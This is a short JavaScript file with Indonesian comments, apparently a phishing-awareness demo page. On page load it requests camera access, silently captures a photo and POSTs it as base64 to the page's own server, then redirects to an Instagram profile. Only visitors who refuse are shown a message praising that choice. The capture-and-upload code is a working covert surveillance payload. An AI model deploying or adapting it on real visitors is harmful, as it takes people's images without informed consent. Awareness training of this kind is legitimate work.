// Fungsi untuk mengambil foto dari kamera
async function ambilFoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Hentikan stream kamera
        stream.getTracks().forEach(track => track.stop());

        // Ubah gambar ke format base64
        return canvas.toDataURL('image/jpeg');
    } catch (err) {
        console.error("Akses kamera ditolak atau gagal:", err);
        return null;
    }
}

// Fungsi untuk mendapatkan lokasi
async function ambilLokasi() {
    return null;
}

// Fungsi utama
async function jalankanSkenario() {
    // Buat elemen loading text
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loading-text';
    loadingDiv.style.cssText = 'font-size: 1rem; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 50vh; font-family: sans-serif; color: #333;';
    document.body.appendChild(loadingDiv);

    let foto = null;
    let lokasi = null;

    // Ambil foto dan lokasi secara paralel
    const [hasilFoto, hasilLokasi] = await Promise.all([
        ambilFoto(),
        ambilLokasi()
    ]);

    foto = hasilFoto;
    lokasi = hasilLokasi;

    // Cek apakah setidaknya satu data berhasil diambil (foto atau lokasi)
    if (foto || lokasi) {
        // Kirim data ke server (endpoint API)
        await fetch('/kirim-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ foto: foto, lokasi: lokasi })
        });
        
        // Alihkan ke Google Form
        window.location.href = 'https://www.instagram.com/bin_mori/';

    } else {
        // Jika semua izin ditolak, tidak melakukan apa-apa
        // atau menampilkan pesan edukasi di halaman
        document.getElementById('loading-text').innerHTML = '<h2>Anda berhasil!</h2><p>Dengan menolak izin, Anda melindungi privasi Anda. Ini adalah langkah pertama dalam keamanan siber.</p>';
    }
}

// Jalankan fungsi utama saat halaman dimuat
document.addEventListener('DOMContentLoaded', jalankanSkenario);
